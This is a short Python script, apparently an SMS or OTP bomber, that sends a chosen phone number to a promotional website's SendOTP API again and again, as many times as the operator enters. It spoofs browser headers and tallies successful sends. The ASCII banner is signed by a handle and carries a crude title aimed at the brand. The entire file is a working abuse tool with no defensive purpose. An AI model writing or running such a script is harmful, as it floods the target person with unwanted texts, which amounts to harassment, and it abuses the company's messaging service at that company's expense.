import requests
import json
from colorama import Fore, Style, init  # Import colorama for text coloring

# Initialize colorama
init(autoreset=True)  # This will automatically reset text color changes

banner = """
_________                         _________     ______           __________            ______              
__  ____/_________________ _      __  ____/________  /_____ _    ___  ____/___  __________  /______________
_  /    _  __ \  ___/  __ `/_______  /    _  __ \_  /_  __ `/    __  /_   _  / / /  ___/_  //_/  _ \_  ___/
/ /___  / /_/ / /__ / /_/ /_/_____/ /___  / /_/ /  / / /_/ /     _  __/   / /_/ // /__ _  ,<  /  __/  /    
\____/  \____/\___/ \__,_/        \____/  \____//_/  \__,_/      /_/      \__,_/ \___/ /_/|_| \___//_/     
                                                                                                           

                                                                                              @th3wantedboy
"""

print(banner)

# Define the API endpoint
api_url = "https://bd-icc23-be.coke2home.com/api/User/SendOTP"

# Function to validate the phone number
def validate_phone_number(phone_number):
    while len(phone_number) < 11 or not phone_number.isdigit():
        print("Invalid phone number. It must be at least 11 digits long and contain only digits.")
        phone_number = input("Enter the phone number: ")
    return phone_number

# Initialize success and failure counters
success_count = 0
failure_count = 0

# Prompt the user for the phone number
phone_number = input("Enter the phone number: ")
phone_number = validate_phone_number(phone_number)

# Prompt the user for the number of requests
num_requests = int(input("Thread: "))

# Define the JSON data with the validated phone number
data = {"MobileNo": phone_number}

# Define the headers you want to include in your request
headers = {
    "Host": "bd-icc23-be.coke2home.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/json",
    "Origin": "https://bd-icc23.coke2home.com",
    "Sec-Gpc": "1",
    "Referer": "https://bd-icc23.coke2home.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "Te": "trailers",
}

# Loop to send POST requests with the validated phone number and headers
for _ in range(num_requests):
    try:
        response = requests.post(api_url, headers=headers, data=json.dumps(data))
        
        if response.status_code == 200:
            success_count += 1
            print(f"{Fore.GREEN}Status Code: {response.status_code} (Success){Style.RESET_ALL}")
        else:
            failure_count += 1
            print(f"{Fore.RED}Status Code: {response.status_code} (Failure){Style.RESET_ALL}")

        # Capture and print the response content for debugging
       # print("Response Content:")
       # print(response.text)
    except Exception as e:
        failure_count += 1
        print(f"{Fore.RED}Request failed: {str(e)}{Style.RESET_ALL}")

# Display the counts of successes and failures
print(f"{Fore.GREEN}{success_count} success(es){Style.RESET_ALL}, {Fore.RED}{failure_count} failure(s){Style.RESET_ALL}")
